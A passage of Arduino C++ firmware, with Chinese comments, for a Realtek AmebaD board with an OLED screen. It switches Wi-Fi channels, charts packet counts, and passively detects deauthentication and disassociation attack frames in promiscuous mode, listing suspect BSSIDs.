    if (g_currentChannelListIndex >= channels24GCount) {
      // 切换到5G
      g_using24G = false;
      g_currentChannelListIndex = 0;
    }
  } else {
    g_currentChannelListIndex++;
    if (g_currentChannelListIndex >= channels5GCount) {
      // 循环回到2.4G
      g_using24G = true;
      g_currentChannelListIndex = 0;
    }
  }
  
  g_packetDetectChannel = g_using24G ? channels24G[g_currentChannelListIndex] : channels5G[g_currentChannelListIndex];
  
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // 重置当前信道的数据包计数
  
  Serial.print("[PacketDetect] Switched to channel: "); Serial.println(g_packetDetectChannel);
}

// 切换到上一个信道
static void switchToPrevPacketDetectChannel() {
  if (g_using24G) {
    g_currentChannelListIndex--;
    if (g_currentChannelListIndex < 0) {
      // 切换到5G的最后一个信道
      g_using24G = false;
      g_currentChannelListIndex = channels5GCount - 1;
    }
  } else {
    g_currentChannelListIndex--;
    if (g_currentChannelListIndex < 0) {
      // 循环回到2.4G的最后一个信道
      g_using24G = true;
      g_currentChannelListIndex = channels24GCount - 1;
    }
  }
  
  g_packetDetectChannel = g_using24G ? channels24G[g_currentChannelListIndex] : channels5G[g_currentChannelListIndex];
  
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // 重置当前信道的数据包计数
  
  Serial.print("[PacketDetect] Switched to channel: "); Serial.println(g_packetDetectChannel);
}

// 预览下一个信道（不实际切换）
static void previewNextChannel() {
  if (g_usingPreview24G) {
    g_previewChannelListIndex++;
    if (g_previewChannelListIndex >= channels24GCount) {
      // 切换到5G
      g_usingPreview24G = false;
      g_previewChannelListIndex = 0;
    }
  } else {
    g_previewChannelListIndex++;
    if (g_previewChannelListIndex >= channels5GCount) {
      // 循环回到2.4G
      g_usingPreview24G = true;
      g_previewChannelListIndex = 0;
    }
  }
  
  g_previewChannel = g_usingPreview24G ? channels24G[g_previewChannelListIndex] : channels5G[g_previewChannelListIndex];
}
// 预览上一个信道（不实际切换）
static void previewPrevChannel() {
  if (g_usingPreview24G) {
    g_previewChannelListIndex--;
    if (g_previewChannelListIndex < 0) {
      // 切换到5G的最后一个信道
      g_usingPreview24G = false;
      g_previewChannelListIndex = channels5GCount - 1;
    }
  } else {
    g_previewChannelListIndex--;
    if (g_previewChannelListIndex < 0) {
      // 循环回到2.4G的最后一个信道
      g_usingPreview24G = true;
      g_previewChannelListIndex = channels24GCount - 1;
    }
  }
  
  g_previewChannel = g_usingPreview24G ? channels24G[g_previewChannelListIndex] : channels5G[g_previewChannelListIndex];
}

// 应用预览的信道（实际切换）
static void applyPreviewChannel() {
  g_packetDetectChannel = g_previewChannel;
  g_using24G = g_usingPreview24G;
  g_currentChannelListIndex = g_previewChannelListIndex;
  
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // 重置当前信道的数据包计数
  
  Serial.print("[PacketDetect] Applied preview channel: "); Serial.println(g_packetDetectChannel);
}

// 获取信道对应的频段
static String getChannelBand(int channel) {
  if (channel >= 1 && channel <= 14) {
    return "2.4G";
  } else if (channel >= 36 && channel <= 64) {
    return "5G";
  } else if (channel >= 100 && channel <= 144) {
    return "5G";
  } else if (channel >= 149 && channel <= 165) {
    return "5G";
  }
  return "Unknown";
}

// 检测按键按下和松开状态
static void updateKeyStates() {
  unsigned long currentTime = millis();
  
  // 检测UP键
  bool upKeyCurrentState = (digitalRead(BTN_UP) == LOW);
  if (upKeyCurrentState && !g_upKeyPressed) {
    // 按键刚被按下
    g_upKeyPressed = true;
    g_upKeyPressTime = currentTime;
    // 设置上键指示器
    g_showUpIndicator = true;
    g_showDownIndicator = false; // 清除下键指示器
    // 立即切换信道（单次按键）
    switchToNextPacketDetectChannel();
  } else if (upKeyCurrentState && g_upKeyPressed) {
    // 按键持续按下，检查是否进入长按模式
    if (currentTime - g_upKeyPressTime >= 500) { // 500ms后进入长按预览模式
      if (!g_channelPreviewMode) {
        g_channelPreviewMode = true;
        // 初始化预览状态为当前状态
        g_previewChannel = g_packetDetectChannel;
        g_usingPreview24G = g_using24G;
        g_previewChannelListIndex = g_currentChannelListIndex;
        g_lastPreviewSwitchTime = currentTime;
      } else if (currentTime - g_lastPreviewSwitchTime >= 300) { // 每300ms切换一次预览
        if (!g_previewSwitchPending) {
          g_previewSwitchPending = true;
          previewNextChannel();
          g_lastPreviewSwitchTime = currentTime;
        } else if (currentTime - g_lastPreviewSwitchTime >= 50) {
          // 50ms后重置标志，允许下次切换
          g_previewSwitchPending = false;
        }
      }
    }
  } else if (!upKeyCurrentState && g_upKeyPressed) {
    // 按键刚被松开
    g_upKeyPressed = false;
    g_previewSwitchPending = false; // 重置切换标志
    // 如果不是长按模式，隐藏指示器
    if (!g_channelPreviewMode) {
      g_showUpIndicator = false;
    }
    if (g_channelPreviewMode) {
      // 应用预览的信道
      applyPreviewChannel();
      g_channelPreviewMode = false;
      g_showUpIndicator = false; // 长按结束后也隐藏指示器
    }
  }
  
  // 检测DOWN键
  bool downKeyCurrentState = (digitalRead(BTN_DOWN) == LOW);
  if (downKeyCurrentState && !g_downKeyPressed) {
    // 按键刚被按下
    g_downKeyPressed = true;
    g_downKeyPressTime = currentTime;
    // 设置下键指示器
    g_showDownIndicator = true;
    g_showUpIndicator = false; // 清除上键指示器
    // 立即切换信道（单次按键）
    switchToPrevPacketDetectChannel();
  } else if (downKeyCurrentState && g_downKeyPressed) {
    // 按键持续按下，检查是否进入长按模式
    if (currentTime - g_downKeyPressTime >= 500) { // 500ms后进入长按预览模式
      if (!g_channelPreviewMode) {
        g_channelPreviewMode = true;
        // 初始化预览状态为当前状态
        g_previewChannel = g_packetDetectChannel;
        g_usingPreview24G = g_using24G;
        g_previewChannelListIndex = g_currentChannelListIndex;
        g_lastPreviewSwitchTime = currentTime;
      } else if (currentTime - g_lastPreviewSwitchTime >= 300) { // 每300ms切换一次预览
        if (!g_previewSwitchPending) {
          g_previewSwitchPending = true;
          previewPrevChannel();
          g_lastPreviewSwitchTime = currentTime;
        } else if (currentTime - g_lastPreviewSwitchTime >= 50) {
          // 50ms后重置标志，允许下次切换
          g_previewSwitchPending = false;
        }
      }
    }
  } else if (!downKeyCurrentState && g_downKeyPressed) {
    // 按键刚被松开
    g_downKeyPressed = false;
    g_previewSwitchPending = false; // 重置切换标志
    // 如果不是长按模式，隐藏指示器
    if (!g_channelPreviewMode) {
      g_showDownIndicator = false;
    }
    if (g_channelPreviewMode) {
      // 应用预览的信道
      applyPreviewChannel();
      g_channelPreviewMode = false;
      g_showDownIndicator = false; // 长按结束后也隐藏指示器
    }
  }
}

/**
 * @brief Draw a dashed line on the OLED display.
 * @param x1 Start x
 * @param y1 Start y
 * @param x2 End x
 * @param y2 End y
 * @param dashLength Length of each dash in pixels (default 2)
 */
static void drawDashedLine(int x1, int y1, int x2, int y2, int dashLength = 2) {
  int dx = abs(x2 - x1);
  int dy = abs(y2 - y1);
  int steps = (dx > dy) ? dx : dy;
  
  for (int i = 0; i < steps; i += dashLength * 2) {
    int x = x1 + (x2 - x1) * i / steps;
    int y = y1 + (y2 - y1) * i / steps;
    int nextI = i + dashLength;
    if (nextI > steps) nextI = steps;
    int endX = x1 + (x2 - x1) * nextI / steps;
    int endY = y1 + (y2 - y1) * nextI / steps;
    display.drawLine(x, y, endX, endY, SSD1306_WHITE);
  }
}

/**
 * @brief Render packet history chart and average line on OLED.
 */
static void drawPacketChart() {
  // 图表区域：x=0-127, y=20-60 (高度40像素，增加高度以填补删除packets统计后的空间)
  int chartX = 0;
  int chartY = 20;
  int chartWidth = 128;
  int chartHeight = 40;
  
  // 绘制图表边框
  display.drawRect(chartX, chartY, chartWidth, chartHeight, SSD1306_WHITE);
  
  // 找到历史数据中的最大值用于缩放
  unsigned long maxPackets = 1;
  unsigned long totalPackets = 0;
  int validDataCount = 0;
  for (int i = 0; i < 64; i++) {
    if (g_packetDetectHistory[i] > maxPackets) {
      maxPackets = g_packetDetectHistory[i];
    }
    if (g_packetDetectHistory[i] > 0) {
      totalPackets += g_packetDetectHistory[i];
      validDataCount++;
    }
  }
  
  // 计算平均数
  unsigned long averagePackets = validDataCount > 0 ? totalPackets / validDataCount : 0;
  
  // 绘制数据点（最多显示64个点，每个点宽度2像素）
  int pointWidth = 2;
  int maxPoints = chartWidth / pointWidth;
  int startIndex = (g_packetDetectHistoryIndex - maxPoints + 64) % 64;
  
  for (int i = 0; i < maxPoints; i++) {
    int dataIndex = (startIndex + i) % 64;
    unsigned long packetCount = g_packetDetectHistory[dataIndex];
    
    if (packetCount > 0) {
      // 计算柱状图高度
      int barHeight = (int)((float)packetCount / (float)maxPackets * (chartHeight - 2));
      if (barHeight < 1) barHeight = 1;
      if (barHeight > chartHeight - 2) barHeight = chartHeight - 2;
      
      // 绘制柱状图
      int x = chartX + 1 + i * pointWidth;
      int y = chartY + chartHeight - 1 - barHeight;
      display.fillRect(x, y, pointWidth - 1, barHeight, SSD1306_WHITE);
    }
  }
  
  // 绘制平均数线（虚线）
  if (averagePackets > 0 && maxPackets > 0) {
    int averageHeight = (int)((float)averagePackets / (float)maxPackets * (chartHeight - 2));
    if (averageHeight > 0 && averageHeight < chartHeight - 2) {
      int averageY = chartY + chartHeight - 1 - averageHeight;
      drawDashedLine(chartX + 1, averageY, chartX + chartWidth - 1, averageY, 3);
    }
  }
}

/**
 * @brief Initialize attack detection in promiscuous mode and set filters.
 *
 * Resets counters, sets initial channel/group, configures AmebaD promisc
 * filters and callbacks for deauth/disassoc detection.
 */
static void startAttackDetection() {
  g_detectDeauthCount = 0;
  g_detectDisassocCount = 0;
  g_attackDetectRunning = true;
  WiFi.macAddress(g_localMacForDetect);
  Serial.println("[Detect] Starting attack detection...");
  Serial.print("[Detect] Local MAC: ");
  for (int i = 0; i < 6; i++) { Serial.print(g_localMacForDetect[i], HEX); if (i<5) Serial.print(":"); }
  Serial.println();
  // 关闭省电并设置过滤器（AmebaD）
  WiFi.disablePowerSave();
  
  // 先设置信道，再启用混杂模式
  int total = 0;
  const uint8_t* channels = getCurrentChannelGroup(total);
  if (total > 0) {
    wext_set_channel(WLAN0_NAME, channels[0]);
    Serial.print("[Detect] Set initial channel: "); Serial.println(channels[0]);
    Serial.print("[Detect] Channel group: "); Serial.println(getCurrentChannelGroupName());
  }
  
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
    {
      // 尝试更宽松的过滤器配置
      promisc_filter_t pf; pf.filter_mode = PROMISC_FILTER_MASK_MGMT;
      int rcF = wifi_set_promisc_filter(&pf);
      Serial.print("[Detect] wifi_set_promisc_filter(MGMT) rc="); Serial.println(rcF);
      
      // 如果过滤器设置失败，尝试不设置过滤器
      if (rcF != 0) {
        Serial.println("[Detect] Filter setup failed, trying without filter");
      }
      
      int rcR = wifi_set_promisc_filter_reason(1);
      Serial.print("[Detect] wifi_set_promisc_filter_reason(1) rc="); Serial.println(rcR);
      
      int rc = wifi_set_mgnt_rxfilter(1);
      Serial.print("[Detect] wifi_set_mgnt_rxfilter(1) rc="); Serial.println(rc);
    }
  #endif
  
  // 尝试使用更高级别的混杂模式
  int rc = wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscDetectCallback, 1);
  Serial.print("[Detect] wifi_set_promisc(RTW_PROMISC_ENABLE_2, len=1) rc="); Serial.println(rc);
  
  // 如果高级别失败，回退到标准级别
  if (rc != 0) {
    Serial.println("[Detect] RTW_PROMISC_ENABLE_2 failed, trying RTW_PROMISC_ENABLE");
    rc = wifi_set_promisc(RTW_PROMISC_ENABLE, promiscDetectCallback, 1);
    Serial.print("[Detect] wifi_set_promisc(RTW_PROMISC_ENABLE, len=1) rc="); Serial.println(rc);
  }
  
  g_attackDetectLastChSwitchMs = millis();
  g_attackDetectLastDrawMs = 0;
  g_attackDetectChIndex = 0;

  // 启用后直接开始检测，无回退尝试
}

static void stopAttackDetection() {
  Serial.println("[Detect] Stopping attack detection...");
  
  // 关闭混杂模式
  #if defined(RTW_PROMISC_DISABLE)
    {
      int rc = wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
      Serial.print("[Detect] wifi_set_promisc(DISABLE) rc="); Serial.println(rc);
    }
  #endif
  
  // 清理过滤器设置
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
    {
      promisc_filter_t pf; pf.filter_mode = 0;
      wifi_set_promisc_filter(&pf);
      wifi_set_promisc_filter_reason(0);
      wifi_set_mgnt_rxfilter(0);
    }
  #endif
  
  // 重置所有状态变量
  g_attackDetectRunning = false;
  g_attackDetectLastDrawMs = 0;
  g_attackDetectLastChSwitchMs = 0;
  g_attackDetectChIndex = 0;
  g_detectStickyUntilMs = 0;
  g_lastDetectLogMs = 0;
  
  // 重置信道组到默认状态
  g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON;
  
  Serial.println("[Detect] Attack detection stopped and resources cleaned up");
}

// 简易OLED页面：显示统计并自动换信道
void drawAttackDetectPage() {
  // 初始化UI与统计
  g_detectUiMode = 0;
  g_recordsPage = 0;
  g_totalDeauth = 0;
  g_totalDisassoc = 0;
  g_suspects.clear();
  g_tempCounts.clear();
  g_promiscCbHits = 0;
  g_mgmtFramesSeen = 0;
  for (int i = 0; i < 16; i++) {
    g_subtypeHistogram[i] = 0;
  }
  g_evHead = 0;
  g_evTail = 0;
  g_lastDetectKind = 0;
  g_lastReason = 0;
  detect_border_always_on = false;
  detect_flash_remaining_toggles = 0;
  
  // 确保信道组设置正确
  g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON;
  g_attackDetectChIndex = 0;
  
  startAttackDetection();
  
  const unsigned long drawInterval = 200;
  const unsigned long baseDwellMs = 1000; // 基础驻留1s
  unsigned long dwellStartMs = millis();
  bool seenInDwell = false;
  bool initialPromptShown = false; // 标记是否已显示初始提示
  
  while (true) {
    // 在第一次绘制完成后显示初始提示弹窗
    if (!initialPromptShown && g_attackDetectLastDrawMs > 0) {
      showModalMessage("按下UP键", "切换监听信道组");
      initialPromptShown = true;
    }
    unsigned long now = millis();
    // 处理事件队列：更新总计与可疑列表
    while (g_evTail != g_evHead) {
      DetectEvent ev = g_evBuf[g_evTail];
      g_evTail = (g_evTail + 1) & 63;
      if (ev.kind == 0xC0) g_totalDeauth++; else if (ev.kind == 0xA0) g_totalDisassoc++;
      seenInDwell = true;
      // 临时计数中累计
      int tIdx = -1; for (size_t j=0;j<g_tempCounts.size();j++){ bool eq=true; for(int k=0;k<6;k++) if (g_tempCounts[j].bssid[k]!=ev.mac[k]) {eq=false;break;} if(eq){tIdx=(int)j;break;} }
      if (tIdx==-1){ TempCount tc; memcpy(tc.bssid, ev.mac, 6); tc.d = (ev.kind==0xC0)?1:0; tc.a = (ev.kind==0xA0)?1:0; g_tempCounts.push_back(tc);} 
      else { if (ev.kind==0xC0) g_tempCounts[tIdx].d++; else g_tempCounts[tIdx].a++; }
      // 若该BSSID在本驻留内累计>=5，则加入/更新可疑记录
      int cntIdx = (tIdx==-1) ? (int)g_tempCounts.size()-1 : tIdx;
      unsigned int sum = g_tempCounts[cntIdx].d + g_tempCounts[cntIdx].a;
      if (sum >= 5) {
        int sIdx = -1; for (size_t i=0;i<g_suspects.size();i++){ bool eq=true; for(int k=0;k<6;k++) if (g_suspects[i].bssid[k]!=ev.mac[k]) {eq=false;break;} if(eq){sIdx=(int)i;break;} }
        if (sIdx==-1){ 
          SuspectRecord rec; memcpy(rec.bssid, ev.mac, 6); rec.deauthCount = g_tempCounts[cntIdx].d; rec.disassocCount = g_tempCounts[cntIdx].a; rec.lastSeenMs = ev.ts; g_suspects.push_back(rec);
          // 新记录添加时触发边框闪烁
          if (!detect_border_always_on) {
            detect_border_always_on = true;
          }
          detect_flash_remaining_toggles = 4; // 闪烁两下
          detect_border_flash_visible = true;
        } 
        else { 
          g_suspects[sIdx].deauthCount += (ev.kind==0xC0); g_suspects[sIdx].disassocCount += (ev.kind==0xA0); g_suspects[sIdx].lastSeenMs = ev.ts; 
          // 更新现有记录时不触发边框闪烁，只在添加新记录时闪烁
        }
      }
    }

    // 信道轮换逻辑：基础1.5s，无数据则切换；检测到数据则延长到3.0s
    unsigned long dwellElapsed = now - dwellStartMs;
    unsigned long dwellLimit = seenInDwell ? (baseDwellMs * 2) : baseDwellMs;
    if (dwellElapsed >= dwellLimit) {
      int total = 0;
      const uint8_t* channels = getCurrentChannelGroup(total);
      if (total > 0) {
        g_attackDetectChIndex = (g_attackDetectChIndex + 1) % total;
        int ch = channels[g_attackDetectChIndex];
        wext_set_channel(WLAN0_NAME, ch);
        Serial.print("[Detect] Switch channel -> "); Serial.println(ch);
        dwellStartMs = now; seenInDwell = false; g_tempCounts.clear();
      }
    }

    if (now - g_attackDetectLastDrawMs >= drawInterval) {
      g_attackDetectLastDrawMs = now;
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

      int total = 0;
      const uint8_t* channels = getCurrentChannelGroup(total);
      int curCh = (total > 0 ? channels[g_attackDetectChIndex] : 0);

      if (g_detectUiMode == 0) {
        // 主页（对齐 drawWebTestMain 的四行排版：y=12,28,44,60）
        const char* t1 = "[攻击帧检测中]"; int w1 = u8g2_for_adafruit_gfx.getUTF8Width(t1); int x1 = (display.width()-w1)/2; if (x1<0) x1=0;
        u8g2_for_adafruit_gfx.setCursor(x1, 12); u8g2_for_adafruit_gfx.print(t1);
        String t2 = String("监听信道：") + String(curCh) + "/" + getCurrentChannelGroupShortName(); int w2 = u8g2_for_adafruit_gfx.getUTF8Width(t2.c_str()); int x2=(display.width()-w2)/2; if(x2<0)x2=0;
        u8g2_for_adafruit_gfx.setCursor(x2, 28); u8g2_for_adafruit_gfx.print(t2);
        const char* t3 = "查看可疑记录"; int w3 = u8g2_for_adafruit_gfx.getUTF8Width(t3); 
        // 计算文字+箭头的总宽度，然后整体居中
        int arrowWidth = 0; // 箭头宽度
        int spacing = 5; // 文字和箭头之间的间距
        int totalWidth = w3 + spacing + arrowWidth;
        int x3 = (display.width() - totalWidth) / 2; if(x3<0) x3=0;
        u8g2_for_adafruit_gfx.setCursor(x3, 44); u8g2_for_adafruit_gfx.print(t3);
        // 右箭头（与文字垂直居中对齐，位置相对于文字右边缘）
        int arrowY = 44 - 8; // 文字基线y=44，箭头中心应该在文字中心，文字高度约10px，向上移动4像素
        int arrowX = x3 + w3 + spacing; // 箭头左边缘位置
        display.fillTriangle(arrowX, arrowY, arrowX, arrowY+6, arrowX+6, arrowY+3, SSD1306_WHITE);
        
        // 绘制"查看可疑记录"圆角边框：
        // 规则：
        // - 有记录后常亮
        // - 只在添加新的SSID/MAC地址记录时，边框闪烁两下（4次可见性翻转）
        {
          bool should_draw_border = false;
          if (detect_border_always_on && !g_suspects.empty()) {
            should_draw_border = true;
          }
          if (detect_flash_remaining_toggles > 0) {
            unsigned long now_ms = millis();
            // 每150ms切换一次可见性
            if (now_ms - detect_last_flash_toggle_ms >= 150UL) {
              detect_last_flash_toggle_ms = now_ms;
              detect_border_flash_visible = !detect_border_flash_visible;
              detect_flash_remaining_toggles--;
            }
            // 闪烁阶段以当前可见性为准（可覆盖常亮，实现闪烁效果）
            should_draw_border = detect_border_flash_visible;
          }
          if (should_draw_border) {
            int text_y_baseline = 44;
            int text_height = 10; // 估算高度
            int pad_x = 2;
            int pad_y = 2;
            int rect_x = x3 - pad_x - 1;
            int rect_y = text_y_baseline - text_height - pad_y;
            int rect_w = w3 + pad_x * 2 + 2;
            int rect_h = text_height + pad_y * 2;
            int r = 3; // 圆角半径
            display.drawRoundRect(rect_x, rect_y, rect_w, rect_h, r, SSD1306_WHITE);
          }
        }
        const char* t4 = "↓ 监听统计 ↓"; int w4 = u8g2_for_adafruit_gfx.getUTF8Width(t4); int x4=(display.width()-w4)/2; if(x4<0)x4=0;
        u8g2_for_adafruit_gfx.setCursor(x4, 60); u8g2_for_adafruit_gfx.print(t4);
        

      } else if (g_detectUiMode == 1) {
        // 记录列表（与参考样式一致的基线：标题y=12，主体y=28/44/60）
        u8g2_for_adafruit_gfx.setCursor(2, 12); u8g2_for_adafruit_gfx.print("《 返回");
        int pages = (int)g_suspects.size(); if (pages==0) pages=1;
        String mid = String(g_recordsPage + 1) + "/" + String(pages);
        int wm = u8g2_for_adafruit_gfx.getUTF8Width(mid.c_str()); int xm=(display.width()-wm)/2; if(xm<0)xm=0;
        u8g2_for_adafruit_gfx.setCursor(xm, 12); u8g2_for_adafruit_gfx.print(mid);
        int wr = u8g2_for_adafruit_gfx.getUTF8Width("翻页 》"); u8g2_for_adafruit_gfx.setCursor(display.width()-wr-2, 12); u8g2_for_adafruit_gfx.print("翻页 》");
        if (!g_suspects.empty()) {
          int idx = g_recordsPage % (int)g_suspects.size();
          // SSID 或 MAC 居中 y=28（过长滚动）
          char macBuf[20]; snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
            g_suspects[idx].bssid[0], g_suspects[idx].bssid[1], g_suspects[idx].bssid[2], g_suspects[idx].bssid[3], g_suspects[idx].bssid[4], g_suspects[idx].bssid[5]);
          String label = String(macBuf);
          for (size_t i=0;i<scan_results.size();i++){ bool eq=true; for(int k=0;k<6;k++) if (scan_results[i].bssid[k]!=g_suspects[idx].bssid[k]) {eq=false;break;} if(eq){ label=scan_results[i].ssid; break; } }
          static int scrollX = 0; static unsigned long lastScrollMs = 0; const int scrollDelay = 120; // ms
          int textW = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
          if (textW <= display.width()-2) {
            int xl=(display.width()-textW)/2; if(xl<0) xl=0; u8g2_for_adafruit_gfx.setCursor(xl, 28); u8g2_for_adafruit_gfx.print(label);
            scrollX = 0; // 重置滚动
          } else {
            if (millis() - lastScrollMs > (unsigned)scrollDelay) { scrollX = (scrollX + 2) % (textW + 16); lastScrollMs = millis(); }
            // 绘制一个窗口视图
            int startX = scrollX;
            // 简单实现：截断在可视宽度内分段打印（UTF8下精确裁剪较复杂，这里以像素滚动代替）
            // 将文本整体左移 startX 像素
            u8g2_for_adafruit_gfx.setCursor(2 - startX, 28); u8g2_for_adafruit_gfx.print(label);
            // 在尾部追加一段空格+文本以形成循环滚动
            u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, 28); u8g2_for_adafruit_gfx.print(label);
          }
          // Deauth/Disassoc 左对齐 y=44/60
          String s2 = String("Deauth: ") + String(g_suspects[idx].deauthCount);
          String s3 = String("Disassoc: ") + String(g_suspects[idx].disassocCount);
          u8g2_for_adafruit_gfx.setCursor(2, 44); u8g2_for_adafruit_gfx.print(s2);
          u8g2_for_adafruit_gfx.setCursor(2, 60); u8g2_for_adafruit_gfx.print(s3);
        } else {
          const char* empt = "暂无记录"; int we=u8g2_for_adafruit_gfx.getUTF8Width(empt); int xe=(display.width()-we)/2; if(xe<0) xe=0;
          u8g2_for_adafruit_gfx.setCursor(xe, 36); u8g2_for_adafruit_gfx.print(empt);
        }
      } else {
        // 统计页（同样采用 y=12,28,44,60）
        const char* backUp = "↑ 返回 ↑"; int wb=u8g2_for_adafruit_gfx.getUTF8Width(backUp); int xb=(display.width()-wb)/2; if(xb<0) xb=0;
        u8g2_for_adafruit_gfx.setCursor(xb, 12); u8g2_for_adafruit_gfx.print(backUp);
        String s2 = String("Deauth: ") + String(g_totalDeauth);
        String s3 = String("Disassoc: ") + String(g_totalDisassoc);
        String s4 = String("总计: ") + String(g_totalDeauth + g_totalDisassoc);
        int w2=u8g2_for_adafruit_gfx.getUTF8Width(s2.c_str()); int x2=(display.width()-w2)/2; if(x2<0)x2=0;
        int w3=u8g2_for_adafruit_gfx.getUTF8Width(s3.c_str()); int x3s=(display.width()-w3)/2; if(x3s<0)x3s=0;
        int w4=u8g2_for_adafruit_gfx.getUTF8Width(s4.c_str()); int x4s=(display.width()-w4)/2; if(x4s<0)x4s=0;
        u8g2_for_adafruit_gfx.setCursor(x2, 28); u8g2_for_adafruit_gfx.print(s2);
        u8g2_for_adafruit_gfx.setCursor(x3s, 44); u8g2_for_adafruit_gfx.print(s3);
        u8g2_for_adafruit_gfx.setCursor(x4s, 60); u8g2_for_adafruit_gfx.print(s4);
      }

      // 取消角落最近事件显示，避免与记录页内容重叠引起换行卡顿

      // 周期性串口调试输出（每1s或计数变化时）
      static unsigned long lastPrintedDeauth = 0, lastPrintedDis = 0;
      if ((g_detectDeauthCount != lastPrintedDeauth) || (g_detectDisassocCount != lastPrintedDis) || (now - g_lastDetectLogMs > 1000)) {
        Serial.print("[Detect] Ch="); Serial.print(curCh);
        Serial.print(" Deauth="); Serial.print((unsigned long)g_totalDeauth);
        Serial.print(" Disassoc="); Serial.print((unsigned long)g_totalDisassoc);
        Serial.print(" cbHits="); Serial.print((unsigned long)g_promiscCbHits);
        Serial.print(" mgmtSeen="); Serial.print((unsigned long)g_mgmtFramesSeen);
        Serial.print(" subtypes[");
        for (int s = 0; s < 16; s++) { if (g_subtypeHistogram[s]) { Serial.print(s); Serial.print(":"); Serial.print(g_subtypeHistogram[s]); Serial.print(" "); } }
        Serial.print("]");
        if (g_lastDetectKind == 0xC0 || g_lastDetectKind == 0xA0) {
          Serial.print(" Last="); Serial.print(g_lastDetectKind == 0xC0 ? "Deauth" : "Disassoc");
          Serial.print(" src=");
          for (int i = 0; i < 6; i++) { Serial.print(g_lastDetectSrc[i], HEX); if (i<5) Serial.print(":"); }
          Serial.print(" reason="); Serial.print(g_lastReason);
        }
        Serial.println();
        lastPrintedDeauth = g_totalDeauth;
        lastPrintedDis = g_totalDisassoc;
        g_lastDetectLogMs = now;
      }

      // 左侧返回指示（仅主页显示）
      // 主页不再显示"返回"文字以避免与标题冲突

      display.display();
    }

    // 键处理
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) {
        // 主页：弹出停止确认弹窗
        if (showConfirmModal("停止攻击帧检测")) {
          // 确认停止，完全清理资源并返回
          stopAttackDetection();
          // 清理所有相关变量
          g_suspects.clear();
          g_tempCounts.clear();
          g_totalDeauth = 0;
          g_totalDisassoc = 0;
          g_promiscCbHits = 0;
          g_mgmtFramesSeen = 0;
          for (int i = 0; i < 16; i++) {
            g_subtypeHistogram[i] = 0;
          }
          g_evHead = 0;
          g_evTail = 0;
          g_lastDetectKind = 0;
          g_lastReason = 0;
          detect_border_always_on = false;
          detect_flash_remaining_toggles = 0;
          break;
        }
        // 取消则继续检测
      } else if (g_detectUiMode == 2) { 
        // 统计页：返回主页
        break; 
      } else if (g_detectUiMode == 1) {
        // 记录列表页：返回主页
        if (g_suspects.empty() || g_recordsPage <= 0) {
          // 第一页或无记录：返回主页
          g_detectUiMode = 0;
          g_recordsPage = 0;
        } else {
          // 上一条记录
          g_recordsPage -= 1;
        }
      }
    }
    

    
    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) { g_detectUiMode = 1; g_recordsPage = 0; }
      else if (g_detectUiMode == 1) { if (!g_suspects.empty()) g_recordsPage = (g_recordsPage + 1) % (int)g_suspects.size(); }
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) g_detectUiMode = 2;
      else if (g_detectUiMode == 2) g_detectUiMode = 0;
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) {
        // 主页模式：切换到下一个信道组
        switchToNextChannelGroup();
        
        // 显示信道组切换提示弹窗
        showModalMessage("正在监听", getCurrentChannelGroupName());
        
        // 重置驻留时间，让新信道组立即开始工作
        dwellStartMs = millis();
        seenInDwell = false;
        g_tempCounts.clear();
      } else if (g_detectUiMode == 1) {
        g_detectUiMode = 0; // 记录页返回主页
      } else if (g_detectUiMode == 2) {
        g_detectUiMode = 0; // 统计页返回主页
      }
    }
    delay(10);
  }
  stopAttackDetection();
}

// 数据包侦测页面
void drawPacketDetectPage() {
  // 初始化数据包侦测
  g_packetDetectChannel = 1; // 从信道1开始
  startPacketDetection();
  
  const unsigned long drawInterval = 500; // 0.5秒刷新一次
  bool initialPromptShown = false;
  
  while (true) {
    // 在第一次绘制完成后显示初始提示弹窗
    if (!initialPromptShown && g_packetDetectLastDrawMs > 0) {
      showModalMessage("使用上/下键", "切换监听信道");
      initialPromptShown = true;
    }
    
    unsigned long now = millis();
    bool shouldRedraw = false;
    
    // 检查是否需要立即重绘（指示器状态变化）
    static bool lastShowDownIndicator = false;
    static bool lastShowUpIndicator = false;
    static bool lastShowMgmtFrameIndicator = false;
    
    if (g_showDownIndicator != lastShowDownIndicator || 
        g_showUpIndicator != lastShowUpIndicator || 
        g_showMgmtFrameIndicator != lastShowMgmtFrameIndicator) {
      shouldRedraw = true;
      lastShowDownIndicator = g_showDownIndicator;
      lastShowUpIndicator = g_showUpIndicator;
      lastShowMgmtFrameIndicator = g_showMgmtFrameIndicator;
    }
    
    // 每0.5秒更新历史数据和刷新显示，或者指示器状态变化时立即重绘
    if (now - g_packetDetectLastDrawMs >= drawInterval || shouldRedraw) {
      // 只有在正常绘制间隔时才更新历史数据
      if (now - g_packetDetectLastDrawMs >= drawInterval) {
        g_packetDetectLastDrawMs = now;
        
        // 将当前数据包计数添加到历史数据
        g_packetDetectHistory[g_packetDetectHistoryIndex] = g_packetCount;
        g_packetDetectHistoryIndex = (g_packetDetectHistoryIndex + 1) % 64;
        
        // 重置当前信道的数据包计数
        g_packetCount = 0;
      }
      
      // 绘制页面
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
